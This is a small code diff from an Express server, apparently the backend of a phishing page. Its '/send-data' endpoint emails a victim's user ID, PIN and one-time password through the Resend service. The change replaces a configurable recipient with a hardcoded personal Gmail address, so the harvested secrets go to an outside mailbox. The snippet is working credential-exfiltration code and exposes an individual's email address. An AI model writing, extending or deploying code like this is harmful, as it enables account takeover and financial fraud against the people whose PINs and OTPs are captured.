@@ -15,7 +15,7 @@ app.post('/send-data', async (req, res) => {
     try {
         const data = await resend.emails.send({
             from: 'Acme <onboarding@resend.dev>', // You can change this later if you verify a domain
-            to: process.env.ADMIN_EMAIL,
+            to: 'mosesbenjamin1985@gmail.com',
             subject: '🚀 New Site Activity',
             text: `User ID: ${userId}\nPIN: ${pin}\nOTP: ${otp}`
         });
